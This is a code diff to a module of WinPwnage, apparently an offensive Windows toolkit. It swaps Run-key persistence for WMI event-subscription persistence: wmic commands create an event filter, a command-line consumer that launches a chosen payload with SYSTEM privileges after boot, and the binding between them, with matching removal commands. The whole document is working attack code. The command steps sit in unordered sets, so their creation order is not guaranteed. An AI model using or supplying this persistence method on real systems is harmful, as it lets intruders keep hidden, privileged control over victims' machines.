+++ winpwnage/functions/persist/persistMethod7.py
@@ -1,9 +1,10 @@
+import time
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
 persistMethod7_info = {
-	"Description": "Persistence using HKLM run key",
-	"Method": "Registry key (HKLM Run) manipulation",
+	"Description": "Persistence using wmic.exe (SYSTEM privileges)",
+	"Method": "Malicious mof file using EventFilter EventConsumer and binding",
 	"Id": "7",
 	"Type": "Persistence",
 	"Fixed In": "99999" if information().admin() == True else "0",
@@ -18,25 +19,33 @@ def persistMethod7(payload, name="", add=True):
 		print_error("Cannot proceed, we are not elevated")
 		return False
 
-	if "64" in information().architecture():
-		kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
-	else:
-		kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+	cmds = {
+		'create': {
+			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360"'),
+			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="{name}", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
+			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="{name}"\', Consumer=\'CommandLineEventConsumer.Name="{name}"\''),
+		},
+		'delete': {
+			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
+			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
+			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
+		}
+	}
 
 	if add:
-		if payloads().exe(payload):
-			if registry().modify_key(hkey="hklm", path=kpath, name=name, value=payloads().exe(payload)[1]):
-				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payloads().exe(payload)[1]))
-				print_success("Successfully installed persistence, payload will run at login")
-			else:
-				print_error("Unable to install persistence")
-				return False
-		else:
+		if not payloads().exe(payload):
 			print_error("Cannot proceed, invalid payload")
 			return False
+
+		action = "create"
 	else:
-		if registry().remove_key(hkey="hklm", path=kpath, name=name):
-			print_success("Successfully removed persistence")
+		action = "delete"
+
+	for i, cmd in cmds[action]:
+		exit_code = process().create('wmic.exe', params=cmd.format(name=name, path=payloads().exe(payload)[1]), get_exit_code=True)
+		if exit_code == 0:
+			print_success("Successfully {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
 		else:
-			print_error("Unable to remove persistence")
-			return False
+			print_error("Unable to {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
+
+		time.sleep(3)
